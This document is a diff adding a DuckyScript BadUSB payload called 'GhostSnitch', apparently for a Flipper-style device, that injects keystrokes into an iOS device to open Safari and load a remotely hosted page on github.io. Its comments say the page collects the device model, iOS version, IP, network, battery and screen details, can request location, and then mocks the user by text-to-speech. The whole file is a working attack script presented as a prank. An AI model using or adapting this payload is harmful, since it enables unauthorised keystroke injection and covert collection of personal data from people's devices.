@@ -1,0 +1,44 @@
+REM GhostSnitch iOS Payload
+REM Author: TBJr
+REM Description: Executes iOS prank script via Safari Web APIs
+REM Version: 1.0 - Universal iOS support via Web APIs
+REM 
+REM This payload works on ANY iOS device with Safari (pre-installed)
+REM No jailbreak or special apps required!
+REM
+REM IMPORTANT: iOS BadUSB limitations:
+REM - iOS doesn't support command-line execution (unlike Android/Unix)
+REM - No universal keyboard shortcuts for app launching
+REM - This payload uses Spotlight search to open Safari
+REM - Manual intervention may be required on some devices/lock screens
+
+REM Step 1: Open Spotlight search (Cmd+Space on macOS, but iOS may vary)
+REM Note: On iOS devices, this may require the device to be unlocked
+GUI SPACE
+DELAY 1000
+
+REM Step 2: Search for Safari
+STRING safari
+DELAY 800
+ENTER
+DELAY 2500
+
+REM Step 3: Wait for Safari to fully load
+REM Safari may take a moment to initialize
+DELAY 1000
+
+REM Step 4: Navigate to the hosted script
+REM The script will automatically execute when loaded
+STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.html
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Script execution complete
+REM The GhostSnitch script will:
+REM - Collect device information (model, iOS version)
+REM - Gather system info (RAM estimate, IP, network, battery)
+REM - Detect screen resolution and languages
+REM - Optionally request location permission
+REM - Deliver roast via text-to-speech
+
